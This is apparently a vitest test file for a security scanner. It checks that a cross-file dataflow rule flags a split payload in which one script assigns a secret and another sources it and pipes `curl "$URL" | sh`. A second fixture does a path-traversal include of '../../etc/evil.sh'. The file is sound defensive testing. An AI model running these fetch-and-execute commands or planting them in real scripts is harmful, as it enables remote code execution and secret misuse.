import { describe, it, expect } from 'vitest';
import { scan } from '../engine.js';
import { ruleSpecs, ruleset } from '../ruleset.js';
import { compileRuleset } from '../compile.js';
import { shellTaintToSink } from '../matchers/shell-dataflow.js';
import type { FileRecord } from '../types.js';

// The LOAD-BEARING R9b.1 proof (EARS-072): a payload split across FILES that the R9b intra-file pass
// provably MISSES, but the cross-file dataflow rule CATCHES. This pins the value of the whole slice.

// lib.sh captures a tainted SOURCE; install.sh sources it then pipes the value to a shell. Neither
// file ALONE is dangerous (lib.sh only assigns; install.sh's $URL is never assigned IN install.sh).
const lib: FileRecord = { path: 'lib.sh', kind: 'script', content: 'URL=$(get_secret)' };
const install: FileRecord = {
  path: 'install.sh',
  kind: 'script',
  content: ['#!/bin/bash', 'source ./lib.sh', 'curl "$URL" | sh'].join('\n'),
};

/** The dataflow-taint rules compiled in isolation (the R9b + R9b.1 detection surface). */
const dataflowRules = compileRuleset(ruleSpecs.filter((s) => s.detectionClass === 'dataflow-taint'));

describe('cross-file catches what intra-file provably misses (EARS-072)', () => {
  it('the R9b intra-file analyzer raises NOTHING on either file alone', () => {
    expect(shellTaintToSink(lib)).toEqual([]);
    expect(shellTaintToSink(install)).toEqual([]);
  });

  it('scanning each file in ISOLATION (no siblings) raises no dataflow-taint finding', () => {
    expect(scan([lib], dataflowRules)).toEqual([]);
    // install.sh alone: $URL is never tainted (lib.sh not in the set), so no sink fires.
    const alone = scan([install], dataflowRules).filter((f) => f.detectionClass === 'dataflow-taint');
    expect(alone).toEqual([]);
  });

  it('scanning the WHOLE set raises a cross-file dataflow-taint BLOCK at the sink in install.sh', () => {
    const findings = scan([lib, install], dataflowRules);
    const hit = findings.find(
      (f) => f.detectionClass === 'dataflow-taint' && f.file === 'install.sh',
    );
    expect(hit).toBeDefined();
    expect(hit!.tier).toBe('T1');
    expect(hit!.severity).toBe('high');
    expect(hit!.line).toBe(3);
    expect(hit!.owasp.length).toBeGreaterThan(0);
    expect(hit!.atlas.length).toBeGreaterThan(0);
    // the excerpt names the originating sourced file so a reviewer sees both ends of the flow.
    expect(hit!.excerpt).toContain('lib.sh');
  });

  it('the DEFAULT ruleset (T0+T1, intra+cross) flags the split-across-files payload', () => {
    const findings = scan([lib, install], ruleset);
    expect(
      findings.some(
        (f) => f.detectionClass === 'dataflow-taint' && f.tier === 'T1' && f.file === 'install.sh',
      ),
    ).toBe(true);
  });

  it('a path-traversal source include is reported even with no sibling present', () => {
    const escaping: FileRecord = {
      path: 'install.sh',
      kind: 'script',
      content: ['#!/bin/bash', 'source ../../etc/evil.sh'].join('\n'),
    };
    const findings = scan([escaping], dataflowRules);
    const hit = findings.find((f) => f.detectionClass === 'dataflow-taint');
    expect(hit).toBeDefined();
    expect(hit!.line).toBe(2);
    expect(hit!.tier).toBe('T1');
  });

  it('there is at least one cross-file T1 rule in the shipped ruleset', () => {
    expect(
      ruleSpecs.some(
        (s) => s.matcher.kind === 'builtin' && s.matcher.name === 'shell-crossfile-taint-to-sink',
      ),
    ).toBe(true);
  });
});
